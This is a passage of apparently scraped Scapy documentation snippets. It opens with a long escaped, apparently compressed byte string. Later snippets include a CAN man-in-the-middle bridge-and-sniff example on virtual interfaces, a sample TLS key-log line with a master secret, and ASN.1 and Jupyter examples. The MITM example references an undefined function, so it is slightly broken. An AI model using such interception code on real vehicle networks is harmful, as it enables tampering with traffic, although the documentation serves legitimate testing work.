'\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x02\\xff\\xa4;\\t\\x97\\x9bF\\x93\\x7f\\x053/c\\xe9\\r\\x928t!\\r\\xe3u\\x92\\x89\\xe3\\xc4I\\x9c\\xc4\\xd9/\\xdf\\xfay\\xf5\\x1ah\\x04\\x19\\x042\\xb4\\xe6\\xb0F\\xffw\\xf7_lU7\\xa0\\xe6\\x90\\xaf5\\xcf\\xd3\\xa2\\xbb\\xba\\xba\\xeb\\xaej\\xe0\\xf2\\x89\\x9fz\\xecaK\\x95\\x90m\\xe2\\xabK\\xfc\\xabD\\x8cnr/\\xddRGU\\xf9\\r\\x028j\\xc8\\xd8v1\\x1a\\xe5^H7d\\x98f\\xeb\\xd1\\x9f\\x94d^\\xf8\\x07\\xcdw1\\xcb_\\x935U\\x95\\x98$kG\\r2\\x15pQ\\xe2_]n(#\\x8a\\x97&\\x8c&\\xccQ\\x19\\xbdg#\\\\d\\xa9x!\\xc9r\\xca\\x9c\\xbf\\xde\\xfc0\\x98\\xab\\nb\\x1f\\xd0\\xf7\\xbb\\xe8\\xd6Q\\xbf\\x13\\xe0\\x837\\xb0\\xae\\xdaD1\\x8a6\\xb0R>r3\\x92\\xf8Q\\xb2\\x1e\\xad\\xd3t\\x1d\\xd3\\xf5\\xc8\\xb8/\\x7f\\xaer\\x06c$\\xf3W^\\x1a\\xa7\\xd9\\xca0\\xe7\\xfev\\xb8M\\xd6\\x82\\x9cm\\x96n\\x1d\\x95\\xa3\\x01\\xecq\\x94\\xdc(aF\\x83\\x0e\\xd4\\x00\\xe9\\xef<6\\x8a\\xbc\\xb4\\xc2\\x1d\\xa7\\x80\\x0b:T%\\xa3\\xb1\\xa3\\xe6a\\x9a1o\\xc7\\x14\\xe8J\\x00\\x1d\\x8bXL\\xafr\\x8fl\\x1f\\x94\\x81\\xf2\\x07\\x05n\\x01\\x8f\\xa8\\xf2\\x82O\\xbf\\x1c\\x89\\xf1\\xcb\\x9c=@s\\xb6vI\\xa6\\x9d\\xadw9\\xcd\\xf6\\x01P8\\xc8\\xa3\\x0ftaX\\xdb\\xfb\\xe5\\x96\\xf8\\xb8\\x87\\x01K\\xb7\\x0bc{\\xaf<\\x896[X\\x8a$ly\\xe0\\xf3\\xf6!\\x8d\\xd6![\\x98\\xe6\\xf6\\xfeP\\xe0(\\'\\xb9)c\\xe9f1\\xab\\xcfC\\xee\\x0fH\\x1c\\xad\\x93\\x85\\x86S\\x0f\\xc3\\xb5\\x1bj\\xf0\\xc7\\xdf\\xbbi\\xe6\\xd3\\xacZ,O\\xe3\\xc8W\\xce<\\xdb\\x9f\\x05\\xc6R\\xda\\x19,\\x85\\x93\\xca\\xb5\\xf5\\xe56\\xcd#\\x16\\xa5\\xc9\\x82\\xb80i\\xc7\\xe8\\x12q\\x98c\\xa0\\xe0.\\xf2Y\\xb80t\\xfd\\x9b\\xc3\\x7fl\\xa8\\x1f\\x11\\x85\\xc4\\xf1\\x1e\\xa6\\x1b\\xf2\\xd6\\x97\\x1b\\x92\\xad\\xa3d\\xc0w\\xb4\\x18N\\xe8fyK3\\x16y$.\\xf6\\n\\x08\\x0b\\x8a\\x838%l\\x11\\xd3\\x80\\x1d\\x0e\\x04\\x11i\\xf8w\\xbc\\xe7\\x84\\xf9\\xd4K3\\xc2\\xf7\\xb2K\\x80\\x18\\x10,\\x95\\xa8\\xafM\\xe0z\\xb18\\xd3uO\\x86\\x80\\xa1H\\x91\\xc7}\\x7fN\\xcdY\\x03$\\xa8\\x81\\xd8\\xba.\\x8f+\\x97#!\\xdaB\\xc2CPEy\\xdf%\\xb5\\x05\\xa3\\x97)\\xd0\\n\\xa3w\\x8b0\\xf2}\\x9a\\x1c\\x86\\xab\\x87\\xd0\\x97U\\x81s\\xfc\\x9f\\xbd\\xe0\\xa55\\xa6\\x9b\\x83\\x9b\\xfa\\x0f\\x1a\\xf35?\\xba\\xd5\\x86[\\x8d\\x08\\xe8\\x80l\\xa2\\xf8aA\\xb2\\x88\\xc4ZN\\x92|\\x00\\xfa\\x10\\x05KF\\xb6\\x83\\x10X\\x1b#{\\x07b\\xd3\\x190\\xb3gN&Z\\xf9_\\xefs\\xac{\\xb1\\xb9\\x85~ J\\xb4Y\\x17J\\x01\\xb7M\\xee/e\\xf9\\x95:\\x87\\x03\\x0b\\xec\\xa8+2\\xb0,\\x0f\"\\r\\xff\\xe52a3\\x1c\\xba\\xd3\\x86\\xef\\x17\\xc4c\\xd1-\\xc5_\\xb7\\x11(\\x13\\xf5\\xb5!\\x03\\x05\\xde\\x95,6\\x0c\\x0f\\x85\\x17\\xb7\\xc4\\x9c\\xa4\\t\\x05\\x8e\\xfd\\xb5\\xf1\\x15\\xb2@;\\xae\\xe4zm|\\xf7\\xadu8\\x0b\\xd2\\x94\\x956\\xb1\\xd0\\x959\\x1a\\n\\xf6)d\\x7f\\x17\\xc2J\\x83|K<\\nx\\xee2\\xb2=\\x84\\x96\\xbc\\xbfiI\\xc9\\x9d\\xa05I\\xb3\\r\\x89\\x97%\\x8b\\x96\\x15\\xda\\xc3YFs\\x05&\\xfbQ\\xbe\\x8d\\xc9\\xc3\"JP\\xf5\\x0eC\\x10d\\xc1\\'\\x94t\\xb7\\xa1\\x0c\\xc0<t\\x10\\xeap\\xadq\\xb9\\xa2o\\xd4\\x18qc\\xe0G\\xce\\xfc}\\x8b\\x97\\x85\\x8cJ\\x0b7\\xad\\xa3\\x05!>}\\xf9!\\x85n\\xe3\\x90\\xc6J\\x1ci;\\xfc\\xbb\\x8f\\xa3\\x1c\\x90\\xa0>\\n\\x96\\x85\\x86\\x96\\xc60\\xa6\\xc1X\\x17=\\x1b\\xf7:\\xf1\\x95\\xd0\\xdc\\xb7\\xe9?\\x0ci9\\x05D\\xad\\xe8\\x8a>\\x9c\\x81\\xc9\\x1e\\xceP\\xfa\\t\\xb9\\x05\\xcevJ\\xa9\\x1a\\x07\\xac\\x85\\x90fS\\xbc>\\xc6\\xe3\\xc3\\x19\\xcc(]\\x13\\xcc\\x8a\\xc96\\xa7\\x8b\\xf2G\\xcd\\x94@\\x9bd\\xf7\\xc6]\\x04\\xceV\\x80\\x87R\\xbf\\x07!\\x84f\\x87a\\x92\\xbaY\\x97\\n\\x0cY~r\\xbd\\xc30W`V)e\\xa1|^\\xeeV=n\\x9cz7\\xa5i\\x8cu\\x14\\x97\\x08(+.P\\xdc\\n*\\xc6\\xa0T\\x8a\\x99d<\\x858Q\\xeb\\x1a\\xb3$C\\x94=\\xb3\\xe7U\\x12C\\x17q\\xc6\\\\_;#\\xe0\\xc9\\xeb\\xbb\\xd9\\x00\\x83\\x8eJx\\xe0\\x10rd\\xb1\\x8a\\xb9\\xa8&M\\xfd]\\xbd|\\x03\\xa6\\xb8\\xfa\\xe9\\x8d\\xdfP\\xbay9\\t\\xec\\x94\\xc93\\xc5\\x9a\\x8d@V\\xa3yh6I\\xb6\\x9a.d^\\x8a2\\x02/\\x9e\\xb0\\xc5\\x00\\x97C\\x8f\\x90kC\\xb7\\xa6\\x92n\\x1a\\xfb\\x07\\xbai\\xf5\\x15;(\\x14^\\xa8\\xed&\\xda\\xd0\\xca\\xa1\\x10\\xdd\\'\\xee\\xf2\\xc44\\xdc\\xf8\\xfd \\x87Y0m\\x15\\xdf\\xf9{\\x11\\x9a\\x06f=\\x9a\\xb6\\\\w\\x9ez\\xa7\\xd4\\x1f\\xc7\\xca\\xd5\\xe7:^\\x80\\xfa\\xf9w\\'\\xc1a\\xac\\x05~\\xb3\\xf6\\xcb>:\\x9b\\x19\\x86{8[\\xdd~\\xebv(\\x07\\xd5\\xf1*\\xed\\x833\\x15\\x99X\\x8f\\xb4\\xbc\\xa7R\\xa1\\t\\xcc6Ae\\x95\\t2{\\xb5\\xb1\\\\\\xc9\\xf5X&\\xef\\xa4/*\\x1af\\xb3\\xd9\\xb2\\xe1+%k\\x148~\\xd4\\xfd\\x13\\xe0\\xe3N\\xf0W\\xe1iR\\xea1\\x86\\x9b\\xd6\\xea\\xcdM\\xf4\\xc9\\t\\x8b\\x92\\xae\\xc3\\xd9m\\xfa\\x11V\\xd5\\xf8\\x80\\x7f\\x80\\xb7\\xbf>x\\x12\\x0fx\\xa8\\x93U\\xb9\\x16\\xfb\\n]\\x9e\\x14\\x0bA\\x02\\xbao\\xa8\\xfd\\x18w\\x9c\\x97[\\x18\\x14\\xb9\\x11\\xa0(:\\x84\\xb6\\xf2]-\\x8f\\x1e\\x88\\x0b\\x9b\\xd2\\xa5K\\xbc\\x9bu\\x96B^S\\xf6\\x06Ap\\x0c)\\x90\\x89\\x12\\x8c\\xa1\\xcbFp\\xe0\\xded\\xf5\\x9a\\xba`\\xc6\\xbf\\xf3\\xbf\\x7f\\xe5n-_x\\x8e\\xf9B\\xcd\\x12x\\xa2\\x80>\\x12\\xe75\\x0c\\x7fR\\xe2\\x93\\x18s\\x7f?\\x88\\x01\\x08\\x95\\xf6\\xf7\\xda\\x00\\xa6|\\xbb\\xcdAZ\\x93w\\x97\\x86\\x85\\xcc\\xf8\\x84\\x86\\xa2 *\\xd1p\\xed\\x14\\x7f\\xc6|\\x1b\\xd9o^\\xc9M\\xf4\\xe1<v\\xe1(\\x1f\\xccapC\\xee\\x0b>[s\\xbdt*\\x95\\xd5\\xd28\\x8e\\xb6y\\x94/\\xdba\\xa0i\\xdau\\xf5\\x13\\xdawk\\xbb\\xfbZ7\\xdfl\\x07\\xaeB^\\xd3\\xe9\\x14fma[\\x1d\\xc8\\xb2\\x9b\\xca\\xb2L\\x03/\\xb4\\x87\\xdf\\xdc\\xca\\x05\\xcc\\xf0Bg\\xf4KP\\xa58\\xb6\\x05\\x1d\\xff\\x1c;<\\x9d;\\t\\xe8\\x90\\xe3\\xc2p\\xf5\\xdd\\xcf\\xebc:;v-\\x1b\\x13\\xb2\\xdc]\\x11)12\\xf4\\x9ak+ \\xbc\\xbd \\xccj8>!\\x1d\\xd3\\x9e4\\xaa\\x0b0\\xe5\\xd9\\xbc\\xde\\'\\xd8?\\x99\\x99\\x9d\\xf8\\x15\\x1e\\xe1\\x1aIW\\x1b\\x8ev\\xc7?y\\x9dc\\xf9R\\xda\\x87o\\xe3\\xd5F\\x06>\\xa3\\xb2%n[2\\x08fr\\xcd|1\\x0b\\xf3\\x15\\x8fk\\xb5\\xb89\\xe6\\x81s\\xf5\\xc3\\xef~\\x13>\\xdf\\xb9\\x01\\xc4\\x9c\\x95\\xc7\\xb2\\xb8\\x91\\xc8/\\xe5\\xc8_$9\\xc8D\\x8bgR\"#f$hVq<\\xf1[y\\xe1q)n\\x06\\xba\"\\x06\\xdc\\xee\\x813\\xd8f\\xcev\\x01\\x94+\\xb4\\x89\\x91\\xfb\\x85<\\xbeQ\\xe0\\x8f_\\xd4\\x16\\xe6D/z\\x1bF?\\xb0*\\xe8\\xd5\\x07\\xcbm\\xe2\\x9aT\\x95^\\x81a\\xf5\\xfb\\xeb*a(\\xcb\\x9c\\x06FQ\\xd5\\xac>\\xec*\\xb5\\x9f\\x8c\\xf1\\xc2\\xc0\\xb7\\xf3j\\x8c\\xee\\xf0\\xb2b\\xf2\\xb7\\r\\xc0\\xf62\\x06\\xf7\\x13\\xc4\\xc3L\\xba\\xc3\\x1do\\x02(\\xbd\\xd3 k&\\xfd\\x85`\\x0c\\xbaQ\\xa4\\xac\\x98\\x0bw\\xb8b\\xaf\\xa2&\\x03L\\xee\\x15\\xf3&%\\xb8\\xee\\xea\\xa7k\\xda\\xe8\\'\\xc3 \\x86\\x01\\xef{\\x85h\\xc34\\x8f!\\x05\\xa8g%\\x9d\\tA\\xbd\\xbc) \\xbd]\\x96\\xc3\\xed6\\x8dxR{\\xc6\\x88\\x9f+]\\x90\\xc5\\x90HPj\\xe3ErQ\\x8c\\xf3\\x8c\\xa4k\\xfc\\x93#E\\xe1\\xd6=\\x18\\xa2;\\xad\\x0f\\xb5\\xa8\\xac*\\xf6C\\x0b\\xd9\\xd4\\xf8\\xee0t\\xe3\\xf5\\xa9d\\xc9\\x03`\\r\\xff4\\x8b@}:5\\x8d\\x8e\\\\PP\\x8b3\\xea\\xa0\\x87\\xe1\\xcd\\xad\\xac\\x0c\\\\\\xae7\\xb7yC\\x99\\xb1O\\xc3~\\xd0\\xabx\\xdb\\xcc\\xb7\\xeb\\x1a\\xc8\\xa1Y3L\\xf1\\xca\\xa9q\\x12PV]\\xc7\\x92\\x8c\\xdb\\xf2\\\\\\x14Y\\x87a\\xd0\\xe2\\xed\\xf6\\'W\\x0e\\x06\\xe1x\\x985R\\xf8e#\\xeav\\xd4ZXQ6L\\x03\\xa3\\xe7k\\xb7\\x81j \\xc8k\\x9f\\xcc\\xb4ce3)\\x01|/\\x12\\xaf*4\\x81\\x1c\\x13L\\xcb\\x18ZX\\xf6\\xe2P\\xbdD\\x1d\\xe0i\\xe3\\x02V\\xf7\\x0eh\\x1fr\\n)q\\x8c\\x9b\\xf6)\\xd3\\x05\\xee\\xe4[\\x88\\xef\\x8d\\xe1\\xa2w\\x95B\\x00k\\x15\\xd6\\xc7\\xa1\\xd39\\xfc\\x11\\xc4U\\xa2}K\\xb1:\\xd9\\xcb:\\xb3Z\\x17/\\xac6\\xb1(<V\\xde\\xc3\\xdb\\xc8\\xa7\\xa9\\x9b\\xdew\\x86\\x00t\\xc1\\x9f*\\xaf\\x0bk\\xd3\\xaa\\x0e,\\x9cvU7\\xc7\\x11Z\\xe0{J\\xb3<m\\x88g\\x9bd\\xcf\\x034\\xe4w\\x0f\\xe9\\x8e-\\x82\\xe8\\x9e\\xfa\\xf2\\xa9\\x9eT\\xf4\\x97\\xd9\\x8bi6\\x8f\\x7fJ\\xa0\\x8aL\\x0c\\x9d\\xca\\xb8\\xf8\\xaf\\x8b\\xca\\xae\\x99\\xa1\\xac\\x9e_\\x9f:\\x93\\xa4\\x01^\\xcd\"\\xb3t\\xda\"\\xfe\\xa1\\xe7\\xe7I\\x8dt\\xaa\\x81\\xb5j\\xf3\\xf0\\xa4,d\\xa5\\x18\\x8e\\x97P\\x16\\xc18\\x89\\xb2\\xc3\\x998>\\xc0S\\xe5\\xeal\\xac\\x1e!\\xb8\\xadvF\\xdec\\xb1]\\r\\xe6\\xdb\\x95\\x97\\xb0\\x1a\\xc4T\\xd4\\xe8\\xab\\x84\\x1c\\xabU\\xc1\\x13N\\xb0\\xf0\\t*O\\xda\\xd5Z}\\'\\x9c\\xd5*\\x88+\\xb6\\x1d]P\\xc99\\x9f\\xe2U&!\\x93i\\xfb\\x90\\x99\\'@\\xbb\\x98\\xfd\\xc9\\x08\\xabdb\\xdbv\\x93\\xdbM\\x9b\\xef:I\\xd9\\xe4\\xf1\\xfa\\xea\\xa8\\xddENo4\\x165k\\x99\\x88d\\xe0R\\xdc\\xe79\\x92\\x8e\\x95iQ\\x9d\\xfer\\xebk\\xc3`\\xb3m1w\\xe8\\xc5iNW.K\\xf6\\xcd\\xea\\xfc,\\x88!\\xd6jgn\\xd0\\n\\xb9r\"Yy)\\xc3,+\\x86\\x86\\xad\\xd5R\\xca\\xa4\\x99[\\x9fm\\xf22^,\\x86\\x96\\x859\\x84\\x9cE,K\\xaf\\xca\\r\\x0b\\x0b\\xed\\x7fw;Z\\xe9\\xac\\xb5\\xa3\\xa6h\\xf0\\x94k\\r,\\xacl[\\xc7y\\xc7\\x02\\x1bxrR3\\x84?Z6\\x8eqZ\\xc7\\xbd\\x13\\xbbQ\\x03Ox%\\x0f\\x12\\x13N\\xc1\\x9e\\xd7L\\xae\\xa3>\\xedR\\x94\\xd5_\\x7f\\xbb\\x1a\\xe1\\x8d\\xec\\xec\\xeb\\xd9\\xcd\\xb2\\x9bK\\x1f;\\xf9n\\x06?y\\xcfm\"J\\xb9\\xcb\\xa7\"\\xe2\\xaeK\\t\\xba\\ty\\x196\\xad\\xcf\\x92\\xacO\\x98q\\xdb\\xa8kGP\\xd2\\xd9*w\\'\\x90/\\xae~\\n\\xfdZ\\x0e\\xe5\\xc6P\\xc1|\\xf6\\xb6j\\x07\\xfb\\xb2?\\\\\\xe5\\xf7\\xde\\'\\x95\\xafn\\x91X\\x96\\x86>\\n\\x0b\\x9aZ\\xf5\\xce3\\x9d\\xbc~\\xc09\\xb6\\x9a\\xbc\\x04c\\x00\\x15\\x82\\x14\\xaf<\\xf2\\xe7\\tpuW\\x84\\xaa\\xe2V\\x8ai\\xa2\\xa7ij\\xab\\xbfw\\xbe\\x04\\xce-\\xbb\\x13\\xb4f\\xb2xb+\\x95\\x80\\xbb,\\xee\\x95\\xcf\\xfd`\\xb1U\\x9c\\xaeS\\xd3\\xb4\\xf1ia_I\\xd2AF\\xb7\\x94t\\x1c\\xf6\\x1d=\\xcd\\x17#S\\x06\\x86\\x85\\xcc\\x18\\xcc\\xc7RM(=1\\xc3\\x9f5[<\\x88\\xc7H_\\xb1\\x92\\x8d\\x91p`\\x8e\\'\\xd2JV\\xb5\\xd2t\\xd2\\xbd\\x92\\xc2\\x9f-\\xf1_\\xa0K_C\\xa2\\xfee\\x8b\\xae\\x92o\\x9b\\x19\\xe7\\xd1$y\\xc4\\xd91\\xaeZB\\xae,\\x033\\xdf\\x92\\x8c\\xb6\\x8fa;\\xf3O\\xc0~\\x05$\\xedOb\\x01\\x98\\xdf\\xf4}\\xed\\xdcM^\\xa3}F\\xa7\\xf8$\\x0fi\\xd9\\xb4\\xcf\\x1f\\xd6\\x19\\x85\\xbd\\xd4\\x0e\\xfb\\xaa\\x94\\x07\\xff~\\xbe{\\xe3\\x1eL_V\\x0f\\\\\\xb9\\xb95}\\x98\\xfe\\x11\\x06\\xb5\\xbd0\\x7f\\xf0t\\x14\\x88.\\xa8\\x97L} *\\xe7\\xcd\\xc0\\xcf\\xd2\\xad\\x9f\\xde%\\x83\\rMv\\x8dRG>G\\xc1\\xd3\\xc8v\\x9a\\xeb{x\\xb5\\x9e\\x07\\xf0s\\xaf\\xae0Q=\\x19\\x13q\\x8d\\xecX\\xda\\x15\\xfd>\\xf0\\'\\x03\\xf7\\x0b<\\x00\\xfb\\xf7\\x8d\\xdb|\\xbc\\xd5\\xed\\x9b\\x01\\xb0p\\xa2\\xed\\xb3TJ)\\xfa\\xd9\\xff\\xba\\xa9\\x02\\x90eY\\xa7$$\\x88/w\\x8fO\\xd8\\x8dSQ\\xa2,\\xc9\\x9b\\xa8\\xc1\\xc8\\x02w\\xbd\\xae\\x9dD\\x05\\x06^\\xcb\\xd3!z\\x82W\\xa9\\x063\\x9e\\xac\\xa1\n```\n\n----------------------------------------\n\nTITLE: Defining Hex Data and Padding in Python for Scapy\nDESCRIPTION: This code defines a long string of escaped hexadecimal values representing binary data alongside a padding variable with null bytes. These are likely used for packet crafting or testing in Scapy, a Python framework for network packet manipulation.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_48\n\nLANGUAGE: python\nCODE:\n```\n     padding   = '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n```\n\n----------------------------------------\n\nTITLE: Implementing CAN MITM Attack with Bridge and Sniff in Python\nDESCRIPTION: This complex example demonstrates how to set up a Man-in-the-Middle attack scenario using CAN sockets, including bridging and sniffing between two virtual CAN interfaces.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nimport threading\nload_contrib('cansocket')\nload_layer(\"can\")\n\nsocket0 = CANSocket(channel='vcan0')\nsocket1 = CANSocket(channel='vcan1')\n\ndef sendPacket():\n    sleep(0.2)\n    socket0.send(CAN(flags='extended', identifier=0x10010000, length=8, data=b'\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08'))\n\ndef forwarding(pkt):\n    return pkt\n\ndef bridge():\n    bSocket0 = CANSocket(channel='vcan0')\n    bSocket1 = CANSocket(channel='vcan1')\n    bridge_and_sniff(if1=bSocket0, if2=bSocket1, xfrm12=forwarding, xfrm21=forwarding, timeout=1)\n    bSocket0.close()\n    bSocket1.close()\n\nthreadBridge = threading.Thread(target=bridge)\nthreadSender = threading.Thread(target=sendMessage)\n\nthreadBridge.start()\nthreadSender.start()\n\npackets = socket1.sniff(timeout=0.3)\n\nsocket0.close()\nsocket1.close()\n```\n\n----------------------------------------\n\nTITLE: Jupyter Cell Control Demo\nDESCRIPTION: Shows Jupyter notebook cell control operations including deletion and interruption.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n# If needed, pause the cell edition with Ctrl-M.\n# Then you can delete the current cell with D+D. You can also undo cell deletion with Z.\n# Finally, should Jupyter become stuck in execution, use Kernel/Interrupt from the menu bar.\nprint('Got it!')\n```\n\n----------------------------------------\n\nTITLE: Logging SSL/TLS Client Random Secret in OpenSSL Format\nDESCRIPTION: A log entry containing the CLIENT_RANDOM identifier followed by the client random value and the master secret in hexadecimal format. This format is used for SSL/TLS session decryption and debugging.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/raw_data/tls_nss_example.keys.txt#2025-04-23_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n# SSL/TLS secrets log file, generated by OpenSSL\nCLIENT_RANDOM c43c799f04ad31e397ee4fe14c8819a19bf5951bbc545cada407c6c7589e60ab b599798159244555ddd10d80b5552a37d327fd6e661f3520194c28ef6e8bb0af6e3fb4d4f9945a61e83a41f2345fa27a\n```\n\n----------------------------------------\n\nTITLE: Defining ASN.1 Objects in Python\nDESCRIPTION: Shows how Scapy defines simple ASN.1 objects like INTEGER and STRING by inheriting from ASN1_Object.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_1\n\nLANGUAGE: Python\nCODE:\n```\nclass ASN1_INTEGER(ASN1_Object):\n    tag = ASN1_Class_UNIVERSAL.INTEGER\n\nclass ASN1_STRING(ASN1_Object):\n    tag = ASN1_Class_UNIVERSAL.STRING\n\nclass ASN1_BIT_STRING(ASN1_STRING):\n    tag = ASN1_Class_UNIVERSAL.BIT_STRING\n```\n\n----------------------------------------\n\nTITLE: Basic Jupyter Notebook Hello World\nDESCRIPTION: Simple print statement demonstrating Jupyter notebook cell execution with Shift+Enter.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/tls/notebook1_x509.ipynb#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n# Use Shift+Enter to run the current cell\nprint('Hello!')\n```\n\n----------------------------------------\n\nTITLE: High Entry Channel Link Example\nDESCRIPTION: Example demonstrating a high entry channel connection that doesn't work due to missing high entry links.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/advanced_usage.rst#2025-04-23_snippet_20\n\nLANGUAGE: pycon\nCODE:\n```\n>>> a2 = CLIHighFeeder()\n>>> a2 >> b\n>>> a2.send(\"hello\")\n```\n\n----------------------------------------\n\nTITLE: Testing FieldListField in Scapy\nDESCRIPTION: Example of testing the FieldListField class in Scapy.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_21\n\nLANGUAGE: python\nCODE:\n```\n>>> TestFLF(\"\\x00\\x02ABCDEFGHIJKL\")\n<TestFLF  the_lenfield=2 the_varfield=['65.66.67.68', '69.70.71.72'] |<Raw  load='IJKL' |>>\n```"
  }
]